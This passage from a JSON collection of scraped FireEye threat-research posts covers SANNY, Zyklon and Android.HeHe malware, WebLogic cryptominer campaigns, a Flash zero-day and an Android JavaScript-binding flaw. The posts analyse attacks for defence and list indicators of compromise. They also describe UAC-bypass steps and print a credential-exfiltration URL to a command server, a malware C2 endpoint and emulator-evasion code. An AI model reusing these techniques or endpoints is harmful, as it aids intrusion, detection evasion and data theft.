a file from the machine put Copy an existing file to a new destination /user Create a new process with explorer.exe access token default command Execute a program on the machine using WinExec() Compression and Encoding Data SANNY malware uses an interesting mechanism for compressing the contents of data collected from the system and encoding it before exfiltration. Instead of using an archiving utility, the malware leverages Shell.Application COM object and calls the CopyHere method of the IShellDispatch interface to perform compression as follows: Creates an empty ZIP file with the name: temp.zip in the %temp% directory. Writes the first 16 bytes of the PK header to the ZIP file. Calls the CopyHere method of IShellDispatch interface to compress the collected data and write to temp.zip. Reads the contents of temp.zip to memory. Deletes temp.zip from the disk. Creates an empty file, post.txt, in the %temp% directory. The temp.zip file contents are Base64 encoded (using the same custom character set mentioned in the previous FTP Config File section) and written to the file: %temp%\\post.txt. Calls the FtpPutFileW function to write the contents of post.txt to the remote file with the format: “from <computer_name_timestamp>.txt” Execution on Windows 7 and User Account Control (UAC) Bypass NTWDBLIB.dll – This component from the CAB file will be extracted to the %windir%\\system32 directory. After this, the cliconfg command is executed by the BAT file. The purpose of this DLL module is to launch the install.bat file. The file cliconfg.exe is a legitimate Windows binary (SQL Client Configuration Utility), loads the library NTWDBLIB.dll upon execution. Placing a malicious copy of NTWDBLIB.dll in the same directory as cliconfg.exe is a technique known as DLL side-loading, and results in a UAC bypass. Execution on Windows 10 and UAC Bypass Update.dll – This component from the CAB file is used to perform UAC bypass on Windows 10. As described in the BAT File Analysis section, if the underlying operating system is Windows 10, then it uses update.dll to begin the execution of code instead of invoking the install.bat file directly. The main actions performed by update.dll are as follows: Executes the following commands to setup the Windows registry for UAC bypass: Leverages a UAC bypass technique that uses the legitimate Windows binary, fodhelper.exe, to perform the UAC bypass on Windows 10 so that the install.bat file is executed with elevated privileges: Creates an additional BAT file, kill.bat, in the current directory to delete evidence of the UAC bypass. The BAT file kills the current process and deletes the components update.dll and kill.bat from the file system: Conclusion This activity shows us that the threat actors using SANNY malware are evolving their malware delivery methods, notably by incorporating UAC bypasses and endpoint evasion techniques. By using a multi-stage attack with a modular architecture, the malware authors increase the difficulty of reverse engineering and potentially evade security solutions. Users can protect themselves from such attacks by disabling Office macros in their settings and practicing vigilance when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources. Indicators of Compromise SHA256 Hash Original Filename b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 РГНФ 2018-2019.doc e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 Copy of communication from Security Council Committee (1718).doc eb394523df31fc83aefa402f8015c4a46f534c0a1f224151c47e80513ceea46f 1.bat a2e897c03f313a097dc0f3c5245071fbaeee316cfb3f07785932605046697170 Setup.cab (64-bit) a3b2c4746f471b4eabc3d91e2d0547c6f3e7a10a92ce119d92fa70a6d7d3a113 Setup.cab (32-bit) Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/02/cve-2017-10271-used-to-deliver-cryptominers.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-02-15",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction FireEye researchers recently observed threat actors abusing CVE-2017-10271 to deliver various cryptocurrency miners. CVE-2017-10271 is a known input validation vulnerability that exists in the WebLogic Server Security Service (WLS Security) in Oracle WebLogic Server versions 12.2.1.2.0 and prior, and attackers can exploit it to remotely execute arbitrary code. Oracle released a Critical Patch Update that reportedly fixes this vulnerability. Users who failed to patch their systems may find themselves mining cryptocurrency for threat actors. FireEye observed a high volume of activity associated with the exploitation of CVE-2017-10271 following the public posting of proof of concept code in December 2017. Attackers then leveraged this vulnerability to download cryptocurrency miners in victim environments. We saw evidence of organizations located in various countries – including the United States, Australia, Hong Kong, United Kingdom, India, Malaysia, and Spain, as well as those from nearly every industry vertical – being impacted by this activity. Actors involved in cryptocurrency mining operations mainly exploit opportunistic targets rather than specific organizations. This coupled with the diversity of organizations potentially affected by this activity suggests that the external targeting calculus of these attacks is indiscriminate in nature. The recent cryptocurrency boom has resulted in a growing number of operations – employing diverse tactics – aimed at stealing cryptocurrencies. The idea that these cryptocurrency mining operations are less risky, along with the potentially nice profits, could lead cyber criminals to begin shifting away from ransomware campaigns. Tactic #1: Delivering the miner directly to a vulnerable server Some tactics we've observed involve exploiting CVE-2017-10271, leveraging PowerShell to download the miner directly onto the victim’s system (Figure 1), and executing it using ShellExecute(). Figure 1: Downloading the payload directly Tactic #2: Utilizing PowerShell scripts to deliver the miner Other tactics involve the exploit delivering a PowerShell script, instead of downloading the executable directly (Figure 2). Figure 2: Exploit delivering PowerShell script This script has the following functionalities: Downloading miners from remote servers Figure 3: Downloading cryptominers As shown in Figure 3, the .ps1 script tries to download the payload from the remote server to a vulnerable server. Creating scheduled tasks for persistence Figure 4: Creation of scheduled task Deleting scheduled tasks of other known cryptominers Figure 5: Deletion of scheduled tasks related to other miners In Figure 4, the cryptominer creates a scheduled task with name “ Update service for Oracle products1 ”.  In Figure 5, a different variant deletes this task and other similar tasks after creating its own, “ Update service for Oracle productsa ”. From this, it’s quite clear that different attackers are fighting over the resources available in the system. Killing processes matching certain strings associated with other cryptominers Figure 6: Terminating processes directly Figure 7: Terminating processes matching certain strings Similar to scheduled tasks deletion, certain known mining processes are also terminated (Figure 6 and Figure 7). Connects to mining pools with wallet key Figure 8: Connection to mining pools The miner is then executed with different flags to connect to mining pools (Figure 8). Some of the other observed flags are: -a for algorithm, -k for keepalive to prevent timeout, -o for URL of mining server, -u for wallet key, -p for password of mining server, and -t for limiting the number of miner threads. Limiting CPU usage to avoid suspicion Figure 9: Limiting CPU Usage To avoid suspicion, some attackers are limiting the CPU usage of the miner (Figure 9). Tactic #3: Lateral movement across Windows environments using Mimikatz and EternalBlue Some tactics involve spreading laterally across a victim’s environment using dumped Windows credentials and the EternalBlue vulnerability ( CVE-2017-0144 ). The malware checks whether its running on a 32-bit or 64-bit system to determine which PowerShell script to grab from the command and control (C2) server. It looks at every network adapter, aggregating all destination IPs of established non-loopback network connections. Every IP address is then tested with extracted credentials and a credential-based execution of PowerShell is attempted that downloads and executes the malware from the C2 server on the target machine. This variant maintains persistence via WMI (Windows Management Instrumentation). The malware also has the capability to perform a Pass-the-Hash attack with the NTLM information derived from Mimikatz in order to download and execute the malware in remote systems. Additionally, the malware exfiltrates stolen credentials to the attacker via an HTTP GET request to: 'http://<C2>:8000/api.php?data=<credential data>'. If the lateral movement with credentials fails, then the malware uses PingCastle MS17-010 scanner (PingCastle is a French Active Directory security tool) to scan that particular host to determine if its vulnerable to EternalBlue, and uses it to spread to that host. After all network derived IPs have been processed, the malware generates random IPs and uses the same combination of PingCastle and EternalBlue to spread to that host. Tactic #4: Scenarios observed in Linux OS We’ve also observed this vulnerability being exploited to deliver shell scripts (Figure 10) that have functionality similar to the PowerShell scripts. Figure 10: Delivery of shell scripts The shell script performs the following activities: Attempts to kill already running cryptominers Figure 11: Terminating processes matching certain strings Downloads and executes cryptominer malware Figure 12: Downloading CryptoMiner Creates a cron job to maintain persistence Figure 13: Cron job for persistence Tries to kill other potential miners to hog the CPU usage Figure 14: Terminating other potential miners The function shown in Figure 14 is used to find processes that have high CPU usage and terminate them. This terminates other potential miners and maximizes the utilization of resources. Conclusion Use of cryptocurrency mining malware is a popular tactic leveraged by financially-motivated cyber criminals to make money from victims. We’ve observed one threat actor mining around 1 XMR/day, demonstrating the potential profitability and reason behind the recent rise in such attacks. Additionally, these operations may be perceived as less risky when compared to ransomware operations, since victims may not even know the activity is occurring beyond the slowdown in system performance. Notably, cryptocurrency mining malware is being distributed using various tactics, typically in an opportunistic and indiscriminate manner so cyber criminals will maximize their outreach and profits. FireEye HX, being a behavior-based solution, is not affected by cryptominer tricks. FireEye HX detects these threats at the initial level of the attack cycle, when the attackers attempt to deliver the first stage payload or when the miner tries to connect to mining pools. At the time of writing, FireEye HX detects this activity with the following indicators: Detection Name POWERSHELL DOWNLOADER (METHODOLOGY) MONERO MINER (METHODOLOGY) MIMIKATZ (CREDENTIAL STEALER) Indicators of Compromise MD5 Name 3421A769308D39D4E9C7E8CAECAF7FC4 cranberry.exe/logic.exe B3A831BFA590274902C77B6C7D4C31AE xmrig.exe/yam.exe 26404FEDE71F3F713175A3A3CEBC619B 1.ps1 D3D10FAA69A10AC754E3B7DDE9178C22 2.ps1 9C91B5CF6ECED54ABB82D1050C5893F2 info3.ps1 3AAD3FABF29F9DF65DCBD0F308FF0FA8 info6.ps1 933633F2ACFC5909C83F5C73B6FC97CC lower.css B47DAF937897043745DF81F32B9D7565 lib.css 3542AC729035C0F3DB186DDF2178B6A0 bootstrap.css Thanks to Dileep Kumar Jallepalli and Charles Carmakal for their help in the analysis. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/02/attacks-leveraging-adobe-zero-day.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-02-03",
                    "source": "www.fireeye.com"
                },
                "text": "On Jan. 31, KISA (KrCERT) published an advisory about an Adobe Flash zero-day vulnerability (CVE-2018-4878) being exploited in the wild. On Feb. 1, Adobe issued an advisory confirming the vulnerability exists in Adobe Flash Player 28.0.0.137 and earlier versions, and that successful exploitation could potentially allow an attacker to take control of the affected system. FireEye began investigating the vulnerability following the release of the initial advisory from KISA. Threat Attribution We assess that the actors employing this latest Flash zero-day are a suspected North Korean group we track as TEMP.Reaper. We have observed TEMP.Reaper operators directly interacting with their command and control infrastructure from IP addresses assigned to the STAR-KP network in Pyongyang. The STAR-KP network is operated as a joint venture between the North Korean Government's Post and Telecommunications Corporation and Thailand-based Loxley Pacific. Historically, the majority of their targeting has been focused on the South Korean government, military, and defense industrial base; however, they have expanded to other international targets in the last year. They have taken interest in subject matter of direct importance to the Democratic People's Republic of Korea (DPRK) such as Korean unification efforts and North Korean defectors. In the past year, FireEye iSIGHT Intelligence has discovered newly developed wiper malware being deployed by TEMP.Reaper, which we detect as RUHAPPY. While we have observed other suspected North Korean threat groups such as TEMP.Hermit employ wiper malware in disruptive attacks, we have not thus far observed TEMP.Reaper use their wiper malware actively against any targets. Attack Scenario Analysis of the exploit chain is ongoing, but available information points to the Flash zero-day being distributed in a malicious document or spreadsheet with an embedded SWF file. Upon opening and successful exploitation, a decryption key for an encrypted embedded payload would be downloaded from compromised third party websites hosted in South Korea. Preliminary analysis indicates that the vulnerability was likely used to distribute the previously observed DOGCALL malware to South Korean victims. Recommendations Adobe stated that it plans to release a fix for this issue the week of Feb. 5, 2018. Until then, we recommended that customers use extreme caution, especially when visiting South Korean sites, and avoid opening suspicious documents, especially Excel spreadsheets. Due to the publication of the vulnerability prior to patch availability, it is likely that additional criminal and nation state groups will attempt to exploit the vulnerability in the near term. FireEye Solutions Detections FireEye Email Security, Endpoint Security with Exploit Guard enabled, and Network Security products will detect the malicious document natively. Email Security and Network Security customers who have enabled the riskware feature may see additional alerts based on suspicious content embedded in malicious documents. Customers can find more information in our FireEye Customer Communities post . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/01/microsoft-office-vulnerabilities-used-to-distribute-zyklon-malware.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-01-17",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction FireEye researchers recently observed threat actors leveraging relatively new vulnerabilities in Microsoft Office to spread Zyklon HTTP malware. Zyklon has been observed in the wild since early 2016 and provides myriad sophisticated capabilities. Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal. The malware may communicate with its command and control (C2) server over The Onion Router (Tor) network if configured to do so. The malware can download several plugins, some of which include features such as cryptocurrency mining and password recovery, from browsers and email software. Zyklon also provides a very efficient mechanism to monitor the spread and impact. Infection Vector We have observed this recent wave of Zyklon malware being delivered primarily through spam emails. The email typically arrives with an attached ZIP file containing a malicious DOC file (Figure 1 shows a sample lure). The following industries have been the primary targets in this campaign: Telecommunications Insurance Financial Services Figure 1: Sample lure documents Attack Flow Spam email arrives in the victim’s mailbox as a ZIP attachment, which contains a malicious DOC file. The document files exploit at least three known vulnerabilities in Microsoft Office, which we discuss in the Infection Techniques section. Upon execution in a vulnerable environment, the PowerShell based payload takes over. The PowerShell script is responsible for downloading the final payload from C2 server to execute it. A visual representation of the attack flow and execution chain can be seen in Figure 2. Figure 2: Zyklon attack flow Infection Techniques CVE-2017-8759 This vulnerability was discovered by FireEye in September 2017, and it is a vulnerability we have observed being exploited in the wild. The DOC file contains an embedded OLE Object that, upon execution, triggers the download of an additional DOC file from the stored URL (seen in Figure 3). Figure 3: Embedded URL in OLE object CVE-2017-11882 Similarly, we have also observed actors leveraging another recently discovered vulnerability (CVE-2017-11882) in Microsoft Office. Upon opening the malicious DOC attachment, an additional download is triggered from a stored URL within an embedded OLE Object (seen in Figure 4). Figure 4: Embedded URL in OLE object Figure 5: HTTP GET request to download the next level payload The downloaded file, doc.doc, is XML-based and contains a PowerShell command (shown in Figure 6) that subsequently downloads the binary Pause.ps1 . Figure 6: PowerShell command to download the Pause.ps1 payload Dynamic Data Exchange (DDE) Dynamic Data Exchange (DDE) is the interprocess communication mechanism that is exploited to perform remote code execution. With the help of a PowerShell script (shown in Figure 7), the next payload ( Pause.ps1) is downloaded. Figure 7: DDE technique used to download the Pause.ps1 payload One of the unique approaches we have observed is the use of dot-less IP addresses (example: hxxp://258476380). Figure 8 shows the network communication of the Pause.ps1 download. Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload ( Pause.ps1 ), which is another PowerShell script that is Base64 encoded (as seen in Figure 8). The Pause.ps1 script is responsible for resolving the APIs required for code injection. It also contains the injectable shellcode. The APIs contain VirtualAlloc(), memset(), and CreateThread(). Figure 9 shows the decoded Base64 code. Figure 9: Base64 decoded Pause.ps1 The injected code is responsible for downloading the final payload from the server (see Figure 10). The final stage payload is a PE executable compiled with .Net framework. Figure 10: Network traffic to download final payload (words.exe) Once executed, the file performs the following activities: Drops a copy of itself in %AppData%\\svchost.exe\\svchost.exe and drops an XML file, which contains configuration information for Task Scheduler (as shown in Figure 11). Unpacks the code in memory via process hollowing. The MSIL file contains the packed core payload in its .Net resource section. The unpacked code is Zyklon. Figure 11: XML configuration file to schedule the task The Zyklon malware first retrieves the external IP address of the infected machine using the following: api.ipify[.]org ip.anysrc[.]net myexternalip[.]com whatsmyip[.]com The Zyklon executable contains another encrypted file in its .Net resource section named tor . This file is decrypted and injected into an instance of InstallUtiil.exe , and functions as a Tor anonymizer. Command & Control Communication The C2 communication of Zyklon is proxied through the Tor network. The malware sends a POST request to the C2 server. The C2 server is appended by the gate.php, which is stored in file memory. The parameter passed to this request is getkey=y. In response to this request, the C2 server responds with a Base64-encoded RSA public key (seen in Figure 12). Figure 12: Zyklon public RSA key After the connection is established with the C2 server, the malware can communicate with its control server using the commands shown in Table 1. Command Action sign Requests system information settings Requests settings from C2 server logs Uploads harvested passwords wallet Uploads harvested cryptocurrency wallet data proxy Indicates SOCKS proxy port opened miner Cryptocurrency miner commands error Reports errors to C2 server ddos DDoS attack commands Table 1: Zyklon accepted commands The following figures show the initial request and subsequent server response for the “settings” (Figure 13), “sign” (Figure 14), and “ddos” (Figure 15) commands. Figure 13: Zyklon issuing “settings” command and subsequent server response Figure 14: Zyklon issuing “sign” command and subsequent server response Figure 15: Zyklon issuing “ddos” command and subsequent server response Plugin Manager Zyklon downloads number of plugins from its C2 server. The plugin URL is stored in file in following format: /plugin/index.php?plugin=< Plugin_Name > The following plugins are found in the memory of the Zyklon malware: /plugin/index.php?plugin=cuda /plugin/index.php?plugin=minerd /plugin/index.php?plugin=sgminer /plugin/index.php?plugin=socks /plugin/index.php?plugin=tor /plugin/index.php?plugin=games /plugin/index.php?plugin=software /plugin/index.php?plugin=ftp /plugin/index.php?plugin=email /plugin/index.php?plugin=browser The downloaded plugins are injected into: Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe. Additional Features The Zyklon malware offers the following additional capabilities (via plugins): Browser Password Recovery Zyklon HTTP can recover passwords from popular web browsers, including: Google Chrome Mozilla Firefox Internet Explorer Opera Browser Chrome Canary/SXS CoolNovo Browser Apple Safari Flock Browser SeaMonkey Browser SRWare Iron Browser Comodo Dragon Browser FTP Password Recovery Zyklon currently supports FTP password recovery from the following FTP applications: FileZilla SmartFTP FlashFXP FTPCommander Dreamweaver WS_FTP Gaming Software Key Recovery Zyklon can recover PC Gaming software keys from the following games: Battlefield Call of Duty FIFA NFS Age of Empires Quake The Sims Half-Life IGI Star Wars Email Password Recovery Zyklon may also collect email passwords from following applications: Microsoft Outlook Express Microsoft Outlook 2002/XP/2003/2007/2010/2013 Mozilla Thunderbird Windows Live Mail 2012 IncrediMail, Foxmail v6.x - v7.x Windows Live Messenger MSN Messenger Google Talk GMail Notifier PaltalkScene IM Pidgin (Formerly Gaim) Messenger Miranda Messenger Windows Credential Manager License Key Recovery The malware automatically detects and decrypts the license/serial keys of more than 200 popular pieces of software, including Office, SQL Server, Adobe, and Nero. Socks5 Proxy Zyklon features the ability to establish a reverse Socks5 proxy server on infected host machines. Hijack Clipboard Bitcoin Address Zyklon has the ability to hijack the clipboard, and replaces the user’s copied bitcoin address with an address served up by the actor’s control server. Zyklon Pricing Researchers identified different versions of Zyklon HTTP being advertised in a popular underground marketplace for the following prices: Normal build: $75 (USD) Tor-enabled build: $125 (USD) Rebuild/Updates: $15 (USD) Payment Method: Bitcoin (BTC) Conclusion Threat actors incorporating recently discovered vulnerabilities in popular software – Microsoft Office, in this case – only increases the potential for successful infections. These types of threats show why it is very important to ensure that all software is fully updated. Additionally, all industries should be on alert, as it is highly likely that the threat actors will eventually move outside the scope of their current targeting. At this time of writing, FireEye Multi Vector Execution (MVX) engine is able to recognize and block this threat. Table 2 lists the current detection and blocking capabilities by product. Detection Name Product Action POWERSHELL DOWNLOADER D (METHODOLOGY) HX Detect SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) HX Detect POWERSHELL DOWNLOADER (METHODOLOGY) HX Detect SUSPICIOUS EQNEDT USAGE (METHODOLOGY) HX Detect TOR (TUNNELER) HX Detect SUSPICIOUS SVCHOST.EXE (METHODOLOGY) HX Detect Malware.Binary.rtf EX/ETP/NX Block Malware.Binary EX/ETP/NX Block FE_Exploit_RTF_CVE_2017_8759 EX/ETP/NX Block FE_Exploit_RTF_CVE201711882_1 EX/ETP/NX Block Table 2: Current detection capabilities by FireEye products Indicators of Compromise The contained analysis is based on the representative sample lures shown in Table 3. MD5 Name 76011037410d031aa41e5d381909f9ce accounts.doc 4bae7fb819761a7ac8326baf8d8eb6ab Courrier.doc eb5fa454ab42c8aec443ba8b8c97339b doc.doc 886a4da306e019aa0ad3a03524b02a1c Pause.ps1 04077ecbdc412d6d87fc21e4b3a4d088 words.exe Table 3: Sample Zyklon lures Network Indicators 154.16.93.182 85.214.136.179 178.254.21.218 159.203.42.107 217.12.223.216 138.201.143.186 216.244.85.211 51.15.78.0 213.251.226.175 93.95.100.202 warnono.punkdns.top Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/01/android-hehe-malware-now-disconnects-phone-calls.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-01-21",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye Labs has recently discovered six variants of a new Android threat that steals text messages and intercepts phone calls. We named this sample set “Android.HeHe” after the name of the activity that is used consistently across all samples. Here is a list of known bot variants: MD5 VirusTotal Detection Ratio 1caa31272daabb43180e079bca5e23c1 1caa31272daabb43180e079bca5e23c1 2/48 2/48 8265041aca378d37006799975fa471d9 8265041aca378d37006799975fa471d9 1/47 1/47 2af4de1df7587fa0035dcefededaedae 2af4de1df7587fa0035dcefededaedae 2/45 2/45 2b41fbfb5087f521be193d8c1f5efb4c 2b41fbfb5087f521be193d8c1f5efb4c 2/46 2/46 aa0ed04426562df25916ff70258daf6c aa0ed04426562df25916ff70258daf6c 1/46 1/46 9507f93d9a64d718682c0871bf354e6f 9507f93d9a64d718682c0871bf354e6f 1/47 1/47 Summary The app disguises itself as “android security” (Figure 1), attempting to provide the users what is advertised as an OS Update. It contacts the command-and-control (CnC) server to register itself then goes on to monitor incoming SMS messages. The CnC is expected to respond with a list of phone numbers that are of interest to the malware author. If one of these numbers sends an SMS or makes a call to an infected device, the malware intercepts the message or call, suppresses device notifications from the device, and removes any trace of the message or call from device logs. Any SMS messages from one of these numbers are logged into an internal database and sent to the CnC server. Any phone calls from these numbers are silenced and rejected. [caption id=\"attachment_4369\" align=\"aligncenter\" width=\"302\"] Figure 1[/caption] Analysis This app starts the main HeHe activity at startup. The constructor of the HeHeActivity registers a handler using the android.os.Handle , which acts as a thread waiting for an object of type android.os.Message to perform different actions, which are outlined below. Because the HeHeActivity implements the standard DailogInterfaceOnClickListener , the start of the app causes the showAlterDailog message to be displayed (Figure 2). [caption id=\"attachment_4373\" align=\"aligncenter\" width=\"404\"] Figure 2: The above messages make the user believe that an OS update check is under progress[/caption] The app then sends an intent to start three services in the background. These services are explained below. Sandbox-evasion tactic This app checks for the presence of an emulator by calling the isEmulator function, which does the following: It checks the value of the MODEL of the device (emulators with the Google ADT bundle have the string “sdk” as a part of the MODEL variable). It also checks to see if the IMSI code is “null” — emulators do not have an IMSI code associated with them. Here is the isEmulator code: String v0 = TelephonyUtils.getImsi(((Context)this)); if(v0 == null) { return; } public static boolean isEmulator() { boolean v0; if((Build.MODEL.equalsIgnoreCase(\"sdk\")) || (Build.MODEL.equalsIgnoreCase(\"google_sdk\"))) { v0 = true; } else { v0 = false; } return v0; } The code checks whether the the app is being run in the Android QEMU emulator. It also checks whether the value of IMSI is equal to null RegisterService This service runs in the background. Once started the app calls the setComponentEnabledSetting method as follows: this.getPackageManager().setComponentEnabledSetting(new ComponentName(((Context)this), HeheActivity.class), 2, 1); This removes the app from the main menu of the phone leading the user to believe that the app is no longer installed on the phone. It then goes on to check the network status of the phone as shown below public void checkNetwork() { \nif(!this.isNetworkAvailable()) {\nthis.setMobileDataEnabled();\n}\n}\n\nAfter the service has been created. The onStart method is called, which checks the message provided as a part of the intent. The message types are START and LOGIN START If the message in the intent is START , The app calls the sendReigsterRequest() function. The sendRegisterRequest function first checks for the presence of an emulator as explained in the \"Sandbox-evasion tactic\" section It then collects the IMSI IMEI, phone number, SMS address and channel ID. It packs all this information into a JSON object. Once the JSON object is created. It is converted to a string, which is sent to the CnC server. The CnC communication is explained below. LOGIN If the message in the intent is LOGIN , the app calls the sendLoginRequest method, which in turn collects the following: Version number of the app (hard-coded as \"1.0.0\") The model of the phone The version of the operating system The type of network associated with the device (GSM/CDMA) This information is also packed into a JSON object, converted into a string, and sent to the CnC server. RegisterBroadcastReceiver service This service is invoked at the start of the app as the RegisterService . It in turn registers the IncomeCallAndSmsReceiver(), which is set to respond to these three intents: android.provider.Telephony.SMS_RECEIVED , which notifies once a SMS has been received on the device android.intent.action.PHONE_STATE , which notifies once the cellular state of the device has changed. Examples include RINGING and OFF_HOOK. android.intent.action.SCREEN_ON , which notifies once the screen has been turned on or turned off. Additionally, it also sets observers over Android content URIs as follows: The SmsObserver is set to observe the content://sms, which enables it to access all SMS messages that are present on the device. The CallObserver is set to observe the content://call_log/calls, which allows it to access the call log of all incoming, outgoing and missed calls on the device. ConnectionService The main HeHe activity mentioned at the start issues the ACTION_START intent to the ConnectionService class as follows: Intent v2 = new Intent(((Context)this), ConnectionService.class); v2.setAction(ConnectionService.ACTION_START); v2.setFlags(268435456);\n\nthis.startService(v2);\n\nLogUtils.debug(\"heheActivity\", \"start connectionService service\");\n\nThe app then starts a timer task that is scheduled to be invoked every 5000 seconds. This timed task does the following: Creates an object instance of the android.os.Message class Sets the value of \"what\" in the Message object to 1 The handler of this message that was initiated in the constructor then gets called which, in turn calls the showFinishBar function that displays the message “현재 OS에서 최신 소프트웨어버전을 사용하고있습니다,” which translates to “The current OS you are using the latest version of the software.” Receivers IncomeCallAndSmsReceiver The RegisterBroadcastReceiver registers this receiver once the app gets started. When an SMS is received on the device. The IncomeCallAndSmsReceiver gets the intent. Because this receiver listens for one of three intents, any intents received by this receiver are checked for their type. If the received intent is of type android.provider.telephony.SMS_RECEIVED , the app extracts the contents of the SMS and the phone number of the sender. If the first three characters of the phone number matches the first three characters from phone numbers in a table named tbl_intercept_info, then the SMS intent is aborted and the SMS is deleted from the devices SMS inbox so that the user never sees it. After the SMS notification is suppressed, the app bundles the SMS as follows: {\n\"content\":\"TESTING\", \n\"createTime\":\"2014-01-10 16:21:36\",\n\"id\":null,\"messageFrom\":\"1234567890\",\n\"token\":null\n}\n\nFrom there, it sends the to the CnC server (http://108.62.240.69:9008/reportMessage) It also records the SMS in the tbl_message_info table in its internal database. If the received intent is of type android.intent.action.PHONE_STATE , the app checks the tbl_intercept_info table in the local database. If the number of the caller appears in this table, then the ringer mode of the phone is set to silent to suppress the notification of the incoming call and the phone call is disconnected. Its corresponding entry from the call logs is also removed, removing all traces of the phone call from the device. No actions have been defined for the android.app.action.SCREEN_ON intent, even though the IncomeCallAndSmsReceiver receiver is the recipient. CnC This app uses two hard-coded IP address to locate its CnC servers: 122.10.92.117 and 58.64.183.12. The app performs all communications through HTTP POST requests . The contents of the HTTP POST are encrypted using AES with a 128-bit key that is hardcoded into the app. The app sends its lastVersion value —to 122.10.92.117, to address is where is used to check for , in which the app sends its version of the app. The address 58.64.183.12 is used to report incoming SMS messages Because the IP address is no longer reachable, responses from the server could not be analyzed. What is clear is that the server sends a JSON object in response, which contains a \"token\" field. Although the CnC server is currently unavailable, we can infer how the app works by examining the how it processes the received responses. The app consists of different data structures that are converted into their equivalent JSON representations when they are sent to the CnC. Also, All JSON object responses are converted into their equivalent internal data structures. We have also observed the mechanism used to populate the internal database which includes tables (tbl_intercept_info) which contain the phone numbers to be blocked. The app uses hxxp://122.10.92.117:9008 and hxxp://58.64.183.12:9008 to send information to the CnC server. The mapping of URLs to their internal class data structures is as follows: GetLastVersionRequest /getLastVersion RegisterRequest /register LoginRequest /login ReportRequest /report GetTaskRequest /getTask ReportMessage Request /reportMessage The meaning and structures of these are explained in the following sections. GetLastVersionRequest This request is sent when the app is first installed on the device. The bot sends the version code of the device (currently set to 1.0.0) to the CnC. The CnC response shall contain the URL to an update if available. The availability of an update is signified through an ‘update’ field in the response [caption id=\"attachment_4377\" align=\"alignnone\" width=\"816\"] Request to CnC to check for version[/caption] RegisterRequest This request is sent when the app sends an intent with a “LOGIN” option to the RegisterService as explained  above. The request contains the IMSI, IMEI, Phone number, SMS address (Phone number), Channel ID, a token and the IP address being used by the app as its CnC. This causes the infected device to be registered with the CnC. LoginRequest This request is sent to further authenticate the device to the CnC, It contains the token previously received, the version of the Bot, the model of the phone, the version of the OS, the type of network and the other active network parameters such as signal strength. In response, It only gets a result value. ReportRequest The report request sends the information present in tbl_report_info to the CnC. This table contains information about other requests that were sent but failed. GetTaskRequest This requests asks for tasks from the CnC server. The response contains a retry interval and a sendSmsActionNotify value. It is sent when the response to the LoginRequest is 401 instead of 200. ReportMessageRequest This request to the CnC sends the contents of the SMS messages that are received on the device. It consists of the contents of the SMS message, the time of the message and the sender of the SMS. This has been observed in the logcat output as follows: Conclusion Android malware variants are mushrooming. Threats such as Android.HeHe and Android.MisoSMS reveal attackers' growing interest in monitoring SMS messages and phone call logs. They also serve as a stark reminder of just how dangerous apps from non-trusted marketplaces can be. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/01/js-binding-over-http-vulnerability-and-javascript-sidedoor.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-01-17",
                    "source": "www.fireeye.com"
                },
                "text": "Third-party libraries, especially ad libraries, are widely used in Android apps. Unfortunately, many of them have security and privacy issues. In this blog, we summarize our findings related to the insecure usage of JavaScript binding in ad libraries. First, we describe a widespread security issue with using JavaScript binding ( addJavascriptInterface ) and loading WebView content over HTTP, which allows a network attacker to take control of the application by hijacking the HTTP traffic. We call this the JavaScript-Binding-Over-HTTP (JS-Binding-Over-HTTP) vulnerability. Our analysis shows that, currently, at least 47 percent of the top 40 ad libraries have this vulnerability in at least one of their versions that are in active use by popular apps on Google Play. Second, we describe a new security issue with the JavaScript binding annotation, which we call JavaScript Sidedoor. Starting with Android 4.2, Google introduced the @JavascriptInterface annotation to explicitly designate and limit which public methods in Java objects are accessible from JavaScript. If an ad library uses @JavascriptInterface annotation to expose security-sensitive interfaces, and uses HTTP to load content in the WebView, then an attacker over the network could inject malicious content into the WebView to misuse the exposed interfaces through the JS binding annotation. We call these exposed JS binding annotation interfaces JS sidedoors . Our analysis shows that these security issues are widespread, have affected popular apps on Google Play accounting for literally billions of app downloads. The parties we notified about these issues have been actively addressing them. Security Issues with JavaScript Binding over HTTP Android uses the JavaScript binding method addJavascriptInterface to enable JavaScript code running inside a WebView to access the app’s Java methods. However, it is widely known that this feature, if not used carefully, presents a potential security risk when running on Android 4.1 or below. As noted by Google: “Use of this method in a WebView containing untrusted content could allow an attacker to manipulate the host application in unintended ways, executing Java code with the permissions of the host application.” [ 1 ] In particular, if an app running on Android 4.1 or below uses the JavaScript binding method addJavascriptInterface and loads the content in the WebView over HTTP, then an attacker over the network could hijack the HTTP traffic, e.g., through WiFi or DNS hijacking, to inject malicious content into the WebView – and thus take control over the host application. We call this the JavaScript-Binding-Over-HTTP (JS-Binding-Over-HTTP) vulnerability. If an app containing such vulnerability has sensitive Android permissions such as access to the camera, then a remote attacker could exploit this vulnerability to perform sensitive tasks such as taking photos or record video in 